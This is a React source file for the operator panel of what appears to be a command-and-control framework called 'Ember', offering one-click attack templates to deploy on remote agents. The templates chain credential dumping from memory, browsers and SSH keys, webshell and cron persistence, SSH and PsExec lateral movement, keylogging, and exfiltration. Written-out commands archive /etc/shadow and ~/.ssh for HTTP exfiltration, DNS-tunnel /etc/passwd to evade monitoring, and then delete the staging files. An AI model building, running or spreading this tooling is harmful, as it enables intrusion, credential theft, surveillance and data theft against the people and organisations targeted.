import { useState, useMemo } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Dialog, DialogContent, DialogDescription, DialogFooter,
  DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import {
  Rocket, Search, Key, Shield, ArrowRightLeft, Upload,
  Terminal, Eye, Zap, Loader2, Play, ChevronDown, ChevronUp,
  Crosshair, Cpu, Flame, AlertTriangle, CheckCircle2,
  FolderSearch, Camera, Keyboard,
} from "lucide-react";

// ─── Template Definitions ───────────────────────────────────────────────────
interface TaskStep {
  taskType: string;
  params: Record<string, string>;
  priority: number;
  requiresElevation: boolean;
  delayMs?: number;
}

interface TaskTemplate {
  id: string;
  name: string;
  description: string;
  category: "recon" | "credential" | "persistence" | "lateral" | "exfil";
  icon: any;
  color: string;
  risk: "low" | "medium" | "high" | "critical";
  steps: TaskStep[];
  estimatedDuration: string;
  tags: string[];
}

const CATEGORY_META = {
  recon: { label: "Reconnaissance", icon: Search, color: "text-emerald-400", bg: "bg-emerald-500/10", border: "border-emerald-500/30" },
  credential: { label: "Credential Ops", icon: Key, color: "text-purple-400", bg: "bg-purple-500/10", border: "border-purple-500/30" },
  persistence: { label: "Persistence", icon: Shield, color: "text-orange-400", bg: "bg-orange-500/10", border: "border-orange-500/30" },
  lateral: { label: "Lateral Movement", icon: ArrowRightLeft, color: "text-cyan-400", bg: "bg-cyan-500/10", border: "border-cyan-500/30" },
  exfil: { label: "Exfiltration", icon: Upload, color: "text-red-400", bg: "bg-red-500/10", border: "border-red-500/30" },
} as const;

const RISK_META = {
  low: { label: "Low", color: "text-emerald-400", bg: "bg-emerald-500/20" },
  medium: { label: "Medium", color: "text-amber-400", bg: "bg-amber-500/20" },
  high: { label: "High", color: "text-orange-400", bg: "bg-orange-500/20" },
  critical: { label: "Critical", color: "text-red-400", bg: "bg-red-500/20" },
};

const TEMPLATES: TaskTemplate[] = [
  {
    id: "full-recon",
    name: "Full Recon Sweep",
    description: "Comprehensive system reconnaissance: users, network, processes, services, and file system enumeration.",
    category: "recon",
    icon: FolderSearch,
    color: "text-emerald-400",
    risk: "low",
    estimatedDuration: "2-5 min",
    tags: ["passive", "enumeration", "discovery"],
    steps: [
      { taskType: "recon", params: { scope: "full" }, priority: 5, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "uname -a && cat /etc/os-release 2>/dev/null || ver" }, priority: 4, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "ip addr show 2>/dev/null || ipconfig /all" }, priority: 4, requiresElevation: false },
      { taskType: "file_ops", params: { action: "list", path: "/etc/" }, priority: 3, requiresElevation: false },
    ],
  },
  {
    id: "network-map",
    name: "Network Discovery",
    description: "Map the local network: ARP table, routing, DNS, listening ports, and active connections.",
    category: "recon",
    icon: Cpu,
    color: "text-blue-400",
    risk: "low",
    estimatedDuration: "1-3 min",
    tags: ["network", "discovery", "passive"],
    steps: [
      { taskType: "recon", params: { scope: "network" }, priority: 5, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "arp -a 2>/dev/null || ip neigh show" }, priority: 4, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "netstat -tlnp 2>/dev/null || ss -tlnp" }, priority: 4, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "cat /etc/resolv.conf 2>/dev/null" }, priority: 3, requiresElevation: false },
    ],
  },
  {
    id: "cred-harvest",
    name: "Credential Harvest",
    description: "Comprehensive credential extraction: memory, files, browser stores, SSH keys, and registry.",
    category: "credential",
    icon: Key,
    color: "text-purple-400",
    risk: "high",
    estimatedDuration: "3-8 min",
    tags: ["credentials", "extraction", "active"],
    steps: [
      { taskType: "cred_dump", params: { target: "memory" }, priority: 8, requiresElevation: true },
      { taskType: "cred_dump", params: { target: "files" }, priority: 7, requiresElevation: false },
      { taskType: "cred_dump", params: { target: "browser" }, priority: 6, requiresElevation: false },
      { taskType: "cred_dump", params: { target: "ssh_keys" }, priority: 6, requiresElevation: false },
      { taskType: "cred_dump", params: { target: "registry" }, priority: 5, requiresElevation: true },
    ],
  },
  {
    id: "ssh-key-grab",
    name: "SSH Key Collection",
    description: "Targeted extraction of SSH keys and known_hosts for lateral movement preparation.",
    category: "credential",
    icon: Key,
    color: "text-violet-400",
    risk: "medium",
    estimatedDuration: "1-2 min",
    tags: ["ssh", "keys", "targeted"],
    steps: [
      { taskType: "cred_dump", params: { target: "ssh_keys" }, priority: 7, requiresElevation: false },
      { taskType: "file_ops", params: { action: "read", path: "~/.ssh/known_hosts" }, priority: 5, requiresElevation: false },
      { taskType: "file_ops", params: { action: "list", path: "~/.ssh/" }, priority: 4, requiresElevation: false },
    ],
  },
  {
    id: "persist-install",
    name: "Persistence Install",
    description: "Establish multiple persistence mechanisms: cron job, service, and startup script.",
    category: "persistence",
    icon: Shield,
    color: "text-orange-400",
    risk: "critical",
    estimatedDuration: "2-5 min",
    tags: ["persistence", "backdoor", "active"],
    steps: [
      { taskType: "persist", params: { method: "cron" }, priority: 8, requiresElevation: false },
      { taskType: "persist", params: { method: "service" }, priority: 7, requiresElevation: true },
      { taskType: "persist", params: { method: "startup" }, priority: 6, requiresElevation: true },
    ],
  },
  {
    id: "webshell-drop",
    name: "Webshell Deploy",
    description: "Deploy a webshell for persistent web-based access to the target system.",
    category: "persistence",
    icon: Terminal,
    color: "text-amber-400",
    risk: "high",
    estimatedDuration: "1-2 min",
    tags: ["webshell", "web", "persistence"],
    steps: [
      { taskType: "persist", params: { method: "webshell" }, priority: 8, requiresElevation: false },
      { taskType: "recon", params: { scope: "services" }, priority: 5, requiresElevation: false },
    ],
  },
  {
    id: "network-pivot",
    name: "Network Pivot",
    description: "Lateral movement via SSH to an adjacent system with credential reuse and recon.",
    category: "lateral",
    icon: ArrowRightLeft,
    color: "text-cyan-400",
    risk: "high",
    estimatedDuration: "3-8 min",
    tags: ["lateral", "pivot", "ssh"],
    steps: [
      { taskType: "lateral_move", params: { target_ip: "TARGET_IP", method: "ssh" }, priority: 9, requiresElevation: false },
      { taskType: "recon", params: { scope: "full" }, priority: 7, requiresElevation: false, delayMs: 5000 },
      { taskType: "cred_dump", params: { target: "ssh_keys" }, priority: 6, requiresElevation: false, delayMs: 3000 },
    ],
  },
  {
    id: "smb-pivot",
    name: "SMB Lateral Move",
    description: "Windows lateral movement via SMB/PsExec to an adjacent system.",
    category: "lateral",
    icon: ArrowRightLeft,
    color: "text-teal-400",
    risk: "high",
    estimatedDuration: "3-5 min",
    tags: ["lateral", "smb", "windows"],
    steps: [
      { taskType: "lateral_move", params: { target_ip: "TARGET_IP", method: "psexec" }, priority: 9, requiresElevation: true },
      { taskType: "recon", params: { scope: "full" }, priority: 7, requiresElevation: false, delayMs: 5000 },
    ],
  },
  {
    id: "data-exfil",
    name: "Data Exfiltration",
    description: "Staged data exfiltration: identify high-value files, stage, compress, and exfil via HTTP.",
    category: "exfil",
    icon: Upload,
    color: "text-red-400",
    risk: "critical",
    estimatedDuration: "5-15 min",
    tags: ["exfil", "data", "extraction"],
    steps: [
      { taskType: "shell_exec", params: { cmd: "find / -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null | head -50" }, priority: 7, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "tar czf /tmp/.staging.tar.gz /etc/shadow /etc/passwd ~/.ssh/ 2>/dev/null" }, priority: 8, requiresElevation: true },
      { taskType: "exfil", params: { path: "/tmp/.staging.tar.gz", method: "http" }, priority: 9, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "rm -f /tmp/.staging.tar.gz" }, priority: 5, requiresElevation: false },
    ],
  },
  {
    id: "dns-exfil",
    name: "DNS Exfiltration",
    description: "Covert data exfiltration using DNS tunneling to bypass network monitoring.",
    category: "exfil",
    icon: Upload,
    color: "text-rose-400",
    risk: "critical",
    estimatedDuration: "5-10 min",
    tags: ["exfil", "dns", "covert"],
    steps: [
      { taskType: "shell_exec", params: { cmd: "cat /etc/passwd | base64 > /tmp/.dns_payload" }, priority: 7, requiresElevation: false },
      { taskType: "exfil", params: { path: "/tmp/.dns_payload", method: "dns" }, priority: 9, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "rm -f /tmp/.dns_payload" }, priority: 5, requiresElevation: false },
    ],
  },
  {
    id: "privesc-auto",
    name: "Auto Privilege Escalation",
    description: "Automated privilege escalation attempt using multiple techniques.",
    category: "recon",
    icon: Zap,
    color: "text-rose-400",
    risk: "high",
    estimatedDuration: "3-10 min",
    tags: ["privesc", "escalation", "auto"],
    steps: [
      { taskType: "privesc", params: { method: "auto" }, priority: 9, requiresElevation: false },
      { taskType: "shell_exec", params: { cmd: "id && whoami" }, priority: 5, requiresElevation: false, delayMs: 3000 },
      { taskType: "screenshot", params: {}, priority: 3, requiresElevation: false },
    ],
  },
  {
    id: "screenshot-keylog",
    name: "Surveillance Package",
    description: "Deploy screenshot capture and keylogger for intelligence gathering.",
    category: "recon",
    icon: Eye,
    color: "text-pink-400",
    risk: "medium",
    estimatedDuration: "1-2 min",
    tags: ["surveillance", "keylog", "screenshot"],
    steps: [
      { taskType: "screenshot", params: {}, priority: 6, requiresElevation: false },
      { taskType: "keylog", params: { action: "start" }, priority: 7, requiresElevation: false },
    ],
  },
];

// ─── Template Card ──────────────────────────────────────────────────────────
function TemplateCard({
  template,
  onDeploy,
}: {
  template: TaskTemplate;
  onDeploy: (t: TaskTemplate) => void;
}) {
  const [expanded, setExpanded] = useState(false);
  const catMeta = CATEGORY_META[template.category];
  const riskMeta = RISK_META[template.risk];
  const CatIcon = catMeta.icon;

  return (
    <Card className={`${catMeta.border} ${catMeta.bg} hover:border-opacity-60 transition-all`}>
      <CardContent className="p-4 space-y-3">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-2">
            <div className={`p-1.5 rounded-md ${catMeta.bg}`}>
              <template.icon className={`h-4 w-4 ${template.color}`} />
            </div>
            <div>
              <h3 className="text-sm font-semibold">{template.name}</h3>
              <div className="flex items-center gap-2 mt-0.5">
                <Badge variant="outline" className={`text-[9px] px-1.5 py-0 ${riskMeta.bg} ${riskMeta.color} border-0`}>
                  {riskMeta.label} Risk
                </Badge>
                <span className="text-[10px] text-muted-foreground">{template.estimatedDuration}</span>
              </div>
            </div>
          </div>
          <Button
            size="sm"
            className="h-7 text-xs bg-zinc-700 hover:bg-zinc-600"
            onClick={() => onDeploy(template)}
          >
            <Play className="h-3 w-3 mr-1" />
            Deploy
          </Button>
        </div>

        <p className="text-xs text-muted-foreground leading-relaxed">{template.description}</p>

        <div className="flex items-center justify-between">
          <div className="flex gap-1 flex-wrap">
            {template.tags.map((tag) => (
              <Badge key={tag} variant="outline" className="text-[9px] px-1.5 py-0 border-zinc-600">
                {tag}
              </Badge>
            ))}
          </div>
          <Button
            variant="ghost"
            size="sm"
            className="h-6 text-[10px] text-muted-foreground"
            onClick={() => setExpanded(!expanded)}
          >
            {template.steps.length} steps
            {expanded ? <ChevronUp className="h-3 w-3 ml-1" /> : <ChevronDown className="h-3 w-3 ml-1" />}
          </Button>
        </div>

        {expanded && (
          <div className="bg-zinc-900/50 rounded-lg p-2 space-y-1.5">
            {template.steps.map((step, i) => (
              <div key={i} className="flex items-center gap-2 text-[11px]">
                <span className="text-muted-foreground font-mono w-4">{i + 1}.</span>
                <Badge variant="outline" className="text-[9px] px-1.5 py-0 font-mono">
                  {step.taskType}
                </Badge>
                <span className="text-zinc-400 truncate flex-1">
                  {Object.entries(step.params).map(([k, v]) => `${k}=${v}`).join(", ") || "no params"}
                </span>
                {step.requiresElevation && (
                  <Zap className="h-3 w-3 text-amber-400 shrink-0" title="Requires elevation" />
                )}
              </div>
            ))}
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ─── Deploy Dialog ──────────────────────────────────────────────────────────
function DeployDialog({
  template,
  agents,
  open,
  onOpenChange,
}: {
  template: TaskTemplate | null;
  agents: Array<{ id: string; name: string }>;
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  const [selectedAgent, setSelectedAgent] = useState("");
  const [targetIp, setTargetIp] = useState("");
  const [deploying, setDeploying] = useState(false);
  const [deployProgress, setDeployProgress] = useState(0);

  const queueTask = trpc.ember.queueTask.useMutation();

  if (!template) return null;

  const needsTargetIp = template.steps.some(
    (s) => s.taskType === "lateral_move" || Object.values(s.params).includes("TARGET_IP")
  );

  const handleDeploy = async () => {
    if (!selectedAgent) {
      toast.error("Select a target agent");
      return;
    }
    if (needsTargetIp && !targetIp) {
      toast.error("Enter a target IP for lateral movement");
      return;
    }

    setDeploying(true);
    setDeployProgress(0);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < template.steps.length; i++) {
      const step = template.steps[i];
      const params = { ...step.params };

      // Replace TARGET_IP placeholder
      if (needsTargetIp) {
        Object.keys(params).forEach((k) => {
          if (params[k] === "TARGET_IP") params[k] = targetIp;
        });
      }

      // Add delay between steps if specified
      if (step.delayMs && i > 0) {
        await new Promise((r) => setTimeout(r, Math.min(step.delayMs!, 2000)));
      }

      try {
        const result = await queueTask.mutateAsync({
          agentId: selectedAgent,
          taskType: step.taskType,
          params,
          priority: step.priority,
          requiresElevation: step.requiresElevation,
        });

        if (result.blocked) {
          failCount++;
          toast.warning(`Step ${i + 1} blocked: ${result.error}`);
        } else {
          successCount++;
        }
      } catch (err: any) {
        failCount++;
        toast.error(`Step ${i + 1} failed: ${err.message}`);
      }

      setDeployProgress(((i + 1) / template.steps.length) * 100);
    }

    setDeploying(false);
    if (failCount === 0) {
      toast.success(`Template "${template.name}" deployed: ${successCount} tasks queued`);
    } else {
      toast.warning(`Template deployed: ${successCount} queued, ${failCount} failed/blocked`);
    }
    onOpenChange(false);
    setSelectedAgent("");
    setTargetIp("");
    setDeployProgress(0);
  };

  const riskMeta = RISK_META[template.risk];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-lg">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Rocket className="h-5 w-5 text-amber-400" />
            Deploy: {template.name}
          </DialogTitle>
          <DialogDescription>
            Deploy {template.steps.length} tasks to the selected agent. Tasks will be queued
            in sequence with the configured priorities.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">
          {/* Risk Warning */}
          {(template.risk === "high" || template.risk === "critical") && (
            <div className={`flex items-start gap-2 p-3 rounded-lg border ${
              template.risk === "critical" ? "bg-red-500/10 border-red-500/30" : "bg-orange-500/10 border-orange-500/30"
            }`}>
              <AlertTriangle className={`h-4 w-4 mt-0.5 shrink-0 ${riskMeta.color}`} />
              <div className="text-xs">
                <p className={`font-semibold ${riskMeta.color}`}>{riskMeta.label} Risk Template</p>
                <p className="text-muted-foreground mt-0.5">
                  {template.risk === "critical"
                    ? "This template performs destructive or highly detectable operations. Ensure proper authorization."
                    : "This template performs active operations that may trigger security alerts."}
                </p>
              </div>
            </div>
          )}

          {/* Agent Selection */}
          <div className="space-y-2">
            <label className="text-sm font-medium">Target Agent</label>
            <Select value={selectedAgent} onValueChange={setSelectedAgent}>
              <SelectTrigger>
                <SelectValue placeholder="Select an agent..." />
              </SelectTrigger>
              <SelectContent>
                {agents.map((a) => (
                  <SelectItem key={a.id} value={a.id}>
                    <span className="flex items-center gap-2">
                      <Flame className="h-3 w-3 text-amber-400" />
                      {a.name}
                    </span>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          {/* Target IP (for lateral movement templates) */}
          {needsTargetIp && (
            <div className="space-y-2">
              <label className="text-sm font-medium">Target IP Address</label>
              <Input
                placeholder="192.168.1.100"
                value={targetIp}
                onChange={(e) => setTargetIp(e.target.value)}
              />
              <p className="text-[10px] text-muted-foreground">
                IP address of the system to pivot to
              </p>
            </div>
          )}

          {/* Steps Preview */}
          <div className="space-y-1.5">
            <label className="text-sm font-medium">Task Sequence ({template.steps.length} steps)</label>
            <div className="bg-zinc-900/50 rounded-lg p-2 space-y-1 max-h-40 overflow-y-auto">
              {template.steps.map((step, i) => (
                <div key={i} className="flex items-center gap-2 text-[11px]">
                  <span className={`font-mono w-4 ${deploying && deployProgress >= ((i + 1) / template.steps.length) * 100 ? "text-emerald-400" : "text-muted-foreground"}`}>
                    {deploying && deployProgress >= ((i + 1) / template.steps.length) * 100 ? "✓" : `${i + 1}.`}
                  </span>
                  <Badge variant="outline" className="text-[9px] px-1.5 py-0 font-mono">
                    {step.taskType}
                  </Badge>
                  <span className="text-zinc-400 truncate flex-1">
                    P{step.priority} {step.requiresElevation ? "⚡" : ""}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Progress Bar */}
          {deploying && (
            <div className="space-y-1">
              <div className="h-2 bg-zinc-800 rounded-full overflow-hidden">
                <div
                  className="h-full bg-amber-500 rounded-full transition-all duration-300"
                  style={{ width: `${deployProgress}%` }}
                />
              </div>
              <p className="text-[10px] text-muted-foreground text-center">
                Deploying... {Math.round(deployProgress)}%
              </p>
            </div>
          )}
        </div>

        <DialogFooter>
          <Button variant="outline" onClick={() => onOpenChange(false)} disabled={deploying}>
            Cancel
          </Button>
          <Button
            onClick={handleDeploy}
            disabled={deploying || !selectedAgent}
            className="bg-amber-600 hover:bg-amber-700"
          >
            {deploying ? (
              <Loader2 className="h-4 w-4 mr-1.5 animate-spin" />
            ) : (
              <Rocket className="h-4 w-4 mr-1.5" />
            )}
            {deploying ? "Deploying..." : `Deploy ${template.steps.length} Tasks`}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

// ─── Main Component ─────────────────────────────────────────────────────────
export default function EmberTaskTemplates({ agents }: { agents: Array<{ id: string; name: string }> }) {
  const [categoryFilter, setCategoryFilter] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [deployTemplate, setDeployTemplate] = useState<TaskTemplate | null>(null);
  const [deployOpen, setDeployOpen] = useState(false);

  const filteredTemplates = useMemo(() => {
    return TEMPLATES.filter((t) => {
      if (categoryFilter !== "all" && t.category !== categoryFilter) return false;
      if (searchQuery) {
        const q = searchQuery.toLowerCase();
        return (
          t.name.toLowerCase().includes(q) ||
          t.description.toLowerCase().includes(q) ||
          t.tags.some((tag) => tag.includes(q))
        );
      }
      return true;
    });
  }, [categoryFilter, searchQuery]);

  const handleDeploy = (template: TaskTemplate) => {
    if (agents.length === 0) {
      toast.error("No active Ember agents available for deployment");
      return;
    }
    setDeployTemplate(template);
    setDeployOpen(true);
  };

  return (
    <Card className="border-zinc-700/50">
      <CardHeader className="pb-3">
        <CardTitle className="text-sm font-semibold flex items-center gap-2">
          <Rocket className="h-4 w-4 text-amber-400" />
          Task Templates
        </CardTitle>
        <p className="text-xs text-muted-foreground mt-1">
          Pre-configured task sequences for common red team operations. Select a template
          and deploy it to any active Ember agent with one click.
        </p>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Filters */}
        <div className="flex gap-2">
          <Input
            placeholder="Search templates..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="h-8 text-xs flex-1"
          />
          <Select value={categoryFilter} onValueChange={setCategoryFilter}>
            <SelectTrigger className="h-8 w-40 text-xs">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="all">All Categories</SelectItem>
              {Object.entries(CATEGORY_META).map(([key, meta]) => (
                <SelectItem key={key} value={key}>
                  <span className="flex items-center gap-1.5">
                    <meta.icon className={`h-3 w-3 ${meta.color}`} />
                    {meta.label}
                  </span>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {/* Category Quick Filters */}
        <div className="flex gap-1.5 flex-wrap">
          {Object.entries(CATEGORY_META).map(([key, meta]) => {
            const count = TEMPLATES.filter((t) => t.category === key).length;
            return (
              <Button
                key={key}
                variant="outline"
                size="sm"
                className={`h-6 text-[10px] px-2 ${
                  categoryFilter === key ? `${meta.bg} ${meta.border} ${meta.color}` : "border-zinc-700"
                }`}
                onClick={() => setCategoryFilter(categoryFilter === key ? "all" : key)}
              >
                <meta.icon className="h-3 w-3 mr-1" />
                {meta.label} ({count})
              </Button>
            );
          })}
        </div>

        {/* Template Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-3 max-h-[600px] overflow-y-auto pr-1">
          {filteredTemplates.map((template) => (
            <TemplateCard key={template.id} template={template} onDeploy={handleDeploy} />
          ))}
          {filteredTemplates.length === 0 && (
            <div className="col-span-2 text-center py-8 text-muted-foreground text-sm">
              No templates match your search
            </div>
          )}
        </div>

        {/* Stats */}
        <div className="flex items-center justify-between text-[10px] text-muted-foreground pt-2 border-t border-zinc-800">
          <span>{TEMPLATES.length} templates available</span>
          <span>{agents.length} active agent{agents.length !== 1 ? "s" : ""} for deployment</span>
        </div>
      </CardContent>

      {/* Deploy Dialog */}
      <DeployDialog
        template={deployTemplate}
        agents={agents}
        open={deployOpen}
        onOpenChange={setDeployOpen}
      />
    </Card>
  );
}
